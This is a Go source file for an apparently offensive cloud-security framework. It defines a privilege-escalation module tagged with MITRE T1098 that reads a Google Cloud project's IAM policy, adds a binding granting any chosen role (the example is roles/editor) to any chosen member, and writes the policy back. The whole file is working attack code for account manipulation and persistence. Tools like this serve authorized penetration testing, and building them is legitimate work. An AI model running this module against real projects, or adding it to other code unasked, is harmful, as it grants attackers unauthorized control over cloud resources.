package iam

import (
	"context"
	"fmt"

	cloudresourcemanager "google.golang.org/api/cloudresourcemanager/v1"

	"github.com/user/nimbus/internal/module"
	"github.com/user/nimbus/internal/output"
)

func init() {
	module.Register(&EscalateSetIAMPolicy{})
}

// EscalateSetIAMPolicy modifies a project's IAM policy to grant a role to a member.
type EscalateSetIAMPolicy struct{}

func (m *EscalateSetIAMPolicy) Info() module.Info {
	return module.Info{
		Name:         "privesc.iam.escalate-setiam-policy",
		Tactic:       module.TacticPrivesc,
		Service:      "iam",
		Description:  "Modify project IAM policy to grant a role to a specified member",
		RequiresAuth: true,
		AttackID:     "T1098",
	}
}

func (m *EscalateSetIAMPolicy) Run(ctx module.RunContext) error {
	member := ctx.Flags["member"]
	role := ctx.Flags["role"]
	project := ""
	if len(ctx.Projects) > 0 {
		project = ctx.Projects[0]
	}

	if member == "" || role == "" || project == "" {
		output.Warn("Usage: run privesc.iam.escalate-setiam-policy --member <member> --role <role> -p <project>")
		output.Info("Example: --member serviceAccount:sa@proj.iam.gserviceaccount.com --role roles/editor")
		return nil
	}

	svc, err := cloudresourcemanager.NewService(context.Background(), ctx.Session.ClientOption())
	if err != nil {
		return fmt.Errorf("create resource manager client: %w", err)
	}

	output.Warn("Modifying IAM policy on project: %s", project)
	output.Info("Adding: %s -> %s", member, role)

	// Get current policy.
	policy, err := svc.Projects.GetIamPolicy(project, &cloudresourcemanager.GetIamPolicyRequest{}).Do()
	if err != nil {
		return fmt.Errorf("get IAM policy: %w", err)
	}

	// Add the new binding.
	found := false
	for _, binding := range policy.Bindings {
		if binding.Role == role {
			binding.Members = append(binding.Members, member)
			found = true
			break
		}
	}
	if !found {
		policy.Bindings = append(policy.Bindings, &cloudresourcemanager.Binding{
			Role:    role,
			Members: []string{member},
		})
	}

	// Set the updated policy.
	_, err = svc.Projects.SetIamPolicy(project, &cloudresourcemanager.SetIamPolicyRequest{
		Policy: policy,
	}).Do()
	if err != nil {
		return fmt.Errorf("set IAM policy: %w", err)
	}

	output.Success("IAM policy updated: %s now has %s on %s", member, role, project)

	if ctx.Findings != nil {
		ctx.Findings <- module.Finding{
			Module:      "privesc.iam.escalate-setiam-policy",
			Severity:    module.SevCritical,
			Title:       "IAM policy modified for privilege escalation",
			Description: fmt.Sprintf("Added %s with role %s to project %s", member, role, project),
			Resource:    project,
			Project:     project,
			Data:        map[string]any{"member": member, "role": role},
		}
	}

	return nil
}
